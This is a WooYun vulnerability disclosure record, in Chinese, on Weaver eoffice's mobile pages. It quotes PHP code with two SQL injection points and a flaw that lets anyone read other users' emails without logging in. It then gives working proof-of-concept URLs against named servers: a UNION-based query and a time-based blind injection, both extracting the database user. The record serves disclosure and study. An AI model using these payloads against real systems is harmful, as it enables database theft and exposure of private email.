{"id": 66199, "wybug_id": "wooyun-2015-0127270", "wybug_title": "泛微eoffice两处sql注入打包+一处越权(无需登录)", "wybug_corp": "泛微eoffice", "wybug_author": "牛肉包子", "wybug_date": "2015-07-22 12:45", "wybug_open_date": "2015-10-22 14:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向公众公开  简要描述： rt 详细说明：  看到E-mobile/calendar_page.php\n$mobilekey = $_REQUEST['mobilesessionkey'];$page = $_REQUEST['page'];$module = $_REQUEST['module'];$scope = $_REQUEST['scope'];$detailid = $_REQUEST['detailid'];$fromid = $_REQUEST['fromid'];$sessionstr = $_REQUEST['sessionkey'];$strexplode = explode( \",\", $sessionstr );$userid = $strexplode[1];$calid = $detailid;$UserInfor = array( );$UserInfor['user_id'] = $userid;$caleApi = new calendar( $UserInfor );$cales = $caleApi->getCalendarInfo( \"\", \"\", \"\", $calid );\n跟进getCalendarInfo函数\npublic function getCalendarInfo( $limit = 0, $start = 0, $date = \"\", $calid = \"\", $keyword = \"\", $order = \"\" )\t\t\t\t{\t\t\t\t\t\t\t\tglobal $connection;\t\t\t\t\t\t\t\t$limit = 0 < $limit ? $limit : $this->default_limit;\t\t\t\t\t\t\t\t$start = 0 < $start ? $start : $this->default_start;\t\t\t\t\t\t\t\t$sql = \"\\r\\n\\t\\t\\t\\tSELECT * FROM calendar \\r\\n\\t\\t\\t\\t    WHERE 1 \\r\\n\\t\\t\\t\\t    AND (\\r\\n\\t\\t\\t\\t       USER_ID='\".$this->userid.\"' \\r\\n\\t\\t\\t\\t       OR \\r\\n\\t\\t\\t\\t       SHARE_USER LIKE '%,\".$this->userid.\",%' \\r\\n\\t\\t\\t\\t       OR \\r\\n\\t\\t\\t\\t       LEFT(SHARE_USER,\".strlen( $this->userid ).\") = '\".$this->userid.\"'\\r\\n\\t\\t\\t\\t)\";\t\t\t\t\t\t\t\tif ( $calid != \"\" )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$sql .= \" AND CAL_ID=\".$calid.\" \"; //注入\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\tif ( $date != \"\" )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$sql .= \" AND TO_DAYS(CAL_BEGIN)=TO_DAYS('\".$date.\"')\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\tif ( $keyword != \"\" )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$sql .= \" AND CAL_CONTENT like '%\".$keyword.\"%'\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\tif ( $order == \"\" )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$sql .= \"ORDER BY CAL_BEGIN DESC LIMIT \".$start.\",\".$limit.\"\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$sql .= \"ORDER BY \".$order.\" DESC LIMIT \".$start.\",\".$limit.\"\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t$rs = exequery( $connection, $sql );\t\t\t\t\t\t\t\t$resultArray = array( );\t\t\t\t\t\t\t\twhile ( $row = mysql_fetch_array( $rs ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$calData['USER_ID'] = $row['USER_ID'];\t\t\t\t\t\t\t\t\t\t\t\t$calData['CAL_ID'] = $row['CAL_ID'];\t\t\t\t\t\t\t\t\t\t\t\t$calData['USER_NAME'] = getusernamenew( $row['USER_ID'] );\t\t\t\t\t\t\t\t\t\t\t\t$calData['CAL_CONTENT'] = $row['CAL_CONTENT'];\t\t\t\t\t\t\t\t\t\t\t\t$calData['CAL_LEVEL'] = $row['CAL_LEVEL'];\t\t\t\t\t\t\t\t\t\t\t\t$calData['CAL_TYPE'] = $row['CAL_TYPE'];\t\t\t\t\t\t\t\t\t\t\t\t$calData['CAL_BEGIN'] = $row['CAL_BEGIN'];\t\t\t\t\t\t\t\t\t\t\t\t$calData['CAL_END'] = $row['CAL_END'];\t\t\t\t\t\t\t\t\t\t\t\t$calData['CAL_WHILE_TYPE'] = $row['CAL_WHILE_TYPE'];\t\t\t\t\t\t\t\t\t\t\t\t$calData['CAL_EACH_WHEEL'] = $row['CAL_EACH_WHEEL'];\t\t\t\t\t\t\t\t\t\t\t\t$calData['CAL_STR_WEEK'] = $row['CAL_STR_WEEK'];\t\t\t\t\t\t\t\t\t\t\t\tarray_push( $resultArray, $calData );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\treturn $resultArray;\t\t\t\t}\n注入#2E-mobile/diarymy_page.php\ninclude_once( \"inc/utility_all.php\" );include_once( \"inc/conn.php\" );include_once( \"api/diary.class.php\" );include_once( \"E-mobile/func_all.php\" );$user_id = $_REQUEST['userid'];$start = $_REQUEST['start'] ? $_REQUEST['start'] : 0;$Diary = new diary( );$SearchStr['start'] = $start;$SearchStr['limit'] = 10;$diaryinfor = $Diary->MobileShowAllDiary( $user_id, $SearchStr );$diaryallcount = $Diary->GetMobileAllDiaryCount( $user_id, $SearchStr );$diarycount = count( $diaryinfor );\n跟进MobileShowAllDiary\npublic function MobileShowAllDiary( $userid, $SearchStr = \"\" )\t\t\t\t{\t\t\t\t\t\t\t\tglobal $connection;\t\t\t\t\t\t\t\t$info = array( );\t\t\t\t\t\t\t\tif ( $SearchStr['under'] != \"\" )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$user_str = substr( $SearchStr['userstr'], 0, -1 );\t\t\t\t\t\t\t\t\t\t\t\tif ( $userid == \"admin\" )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$query = \"SELECT * FROM diary WHERE USER_ID!='admin' AND USER_ID IN (\".$user_str.\")\";\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$query = \"SELECT * FROM diary WHERE USER_ID IN (\".$user_str.\")\";\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$query = \"SELECT * FROM diary WHERE USER_ID='\".$userid.\"'\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\tif ( $SearchStr['content'] != \"\" )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$query .= \" AND CONTENT LIKE '%\".$value.\"%'\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\tif ( $SearchStr['diff'] == \"PuisneDiary\" )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$query .= \" AND DIA_TYPE='1'\";\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t$query .= \" ORDER BY DIA_DATE DESC\";\t\t\t\t\t\t\t\tif ( $SearchStr['start'] !== \"\" )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$query .= \" LIMIT \".$SearchStr['start'].\",\"; //注入\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\tif ( $SearchStr['limit'] != \"\" )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$query .= $SearchStr['limit'];\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t$cursor = exequery( $connection, $query );\t\t\t\t\t\t\t\t$I = 0;\t\t\t\t\t\t\t\twhile ( $ROW = mysql_fetch_array( $cursor ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$info[$I]['diary_id'] = $ROW['DIA_ID'];\t\t\t\t\t\t\t\t\t\t\t\t$info[$I]['person_id'] = $ROW['USER_ID'];\t\t\t\t\t\t\t\t\t\t\t\t$info[$I]['diary_date'] = $ROW['DIA_DATE'];\t\t\t\t\t\t\t\t\t\t\t\t$info[$I]['diary_type'] = $ROW['DIA_TYPE'];\t\t\t\t\t\t\t\t\t\t\t\t$info[$I]['diary_content'] = $ROW['CONTENT'];\t\t\t\t\t\t\t\t\t\t\t\t$info[$I]['diary_creatdate'] = $ROW['ADD_TIME'];\t\t\t\t\t\t\t\t\t\t\t\t$info[$I]['ATTACHMENT_ID'] = $ROW['ATTACHMENT_ID'];\t\t\t\t\t\t\t\t\t\t\t\t$info[$I]['ATTACHMENT_NAME'] = $ROW['ATTACHMENT_NAME'];\t\t\t\t\t\t\t\t\t\t\t\t$Reply = $ROW['DIA_ID']( $ROW['DIA_ID'] );\t\t\t\t\t\t\t\t\t\t\t\t$info[$I]['Reply'] = $Reply;\t\t\t\t\t\t\t\t\t\t\t\t++$I;\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\treturn $info;\t\t\t\t}\n越权遍历邮件#3E-mobile/email_page.php\ninclude_once( \"api/email.class.php\" );include_once( \"inc/conn.php\" );include_once( \"inc/utility_all.php\" );include_once( \"E-mobile/func_all.php\" );$mobilekey = $_REQUEST['mobilesessionkey'];$page = $_REQUEST['page'];$module = $_REQUEST['module'];$scope = $_REQUEST['scope'];$detailid = $_REQUEST['detailid'];$fromid = $_REQUEST['fromid'];$sessionstr = $_REQUEST['sessionkey'];$strexplode = explode( \",\", $sessionstr );$userid = $strexplode[1];$UserInfor = array( );$UserInfor['user_id'] = $userid;$emailId = $detailid;$email = new email( $UserInfor );$emailInfor = $email->getEmailById( $emailId, \"\" );\n然后emailId可控，跟进getEmailById\npublic function getEmailById( $id, $box = \"\" )\t\t\t\t{\t\t\t\t\t\t\t\tglobal $connection;\t\t\t\t\t\t\t\t$sql = \" select * from email where email_id = '{$id}' \";\t\t\t\t\t\t\t\t$cursor = exequery( $connection, $sql );\t\t\t\t\t\t\t\t$row = mysql_fetch_array( $cursor, MYSQL_ASSOC );\t\t\t\t\t\t\t\t$inArray = array( $row );\t\t\t\t\t\t\t\t$inArray = $this->replaceUserStr( \"TO_ID\", \"TO_NAME\", $inArray );\t\t\t\t\t\t\t\t$inArray = $this->replaceUserStr( \"TO_ID2\", \"TO_NAME2\", $inArray );\t\t\t\t\t\t\t\t$inArray = $this->replaceUserStr( \"FROM_ID\", \"FROM_NAME\", $inArray );\t\t\t\t\t\t\t\tif ( $box == \"\" )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$this->updateReadflag( $id );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\treturn $inArray[0];\t\t\t\t}\n查询邮件内容   漏洞证明：  \nhttp://eoffice8.weaver.cn:8028/E-mobile/calendar_page.php?detailid=-5272 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,user(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--\n\n\n\nhttp://eoffice8.weaver.cn:8028/E-mobile/diarymy_page.php?start=1,1 procedure analyse((select IF(MID(user(),1,1)=114, sleep(5),1)),1)\n\n\n\nhttp://219.232.254.131:8082//E-mobile/email_page.php?detailid=7\n\n\n\nhttp://219.232.254.131:8082//E-mobile/email_page.php?detailid=1\n\n\n   修复方案：  0.0   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-07-24 14:26 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-20 18:05 |    \t\t暗香疏影 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:4        | 我感动哭了)\t\t \n  shafa     \n     2015-07-21 10:09 |    \t\t%270x5c \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:26        | 乌拉拉)\t\t \n  前排出售牛肉包子    \n     2015-07-23 17:32 |    \t\t康小泡 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 掉个offer给我吧)\t\t \n  @%270x5c 1毛钱卖不卖    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}